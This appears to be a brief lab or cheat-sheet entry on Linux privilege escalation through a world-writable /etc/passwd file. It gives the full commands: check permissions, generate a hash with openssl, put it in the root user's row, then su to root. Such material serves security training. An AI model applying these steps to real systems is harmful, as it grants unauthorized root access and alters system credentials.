# Weak File Permissions - Writable /etc/passwd

Note that the /etc/passwd file is world-writable:

`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row.

Switch to the root user, using the new password:

`su root`
